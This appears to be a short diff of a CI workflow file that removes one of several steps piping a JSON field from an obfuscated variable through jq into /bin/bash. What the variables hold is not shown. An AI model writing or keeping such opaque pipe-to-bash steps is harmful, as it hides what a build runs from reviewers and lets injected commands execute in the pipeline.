@@ -20,7 +20,6 @@ jobs:
           echo $z1029 | jq -r .jc0 | /bin/bash
           echo $sw84 | jq -r .nkslo83 | /bin/bash
           echo $yh51777 | jq -r .unun228 | /bin/bash
-          echo $e2125 | jq -r .ijfla0 | /bin/bash
           echo $cc9330 | jq -r .fpai14 | /bin/bash
           printf '%s' "$ugv65" | jq -r .eht68 | /bin/bash
 
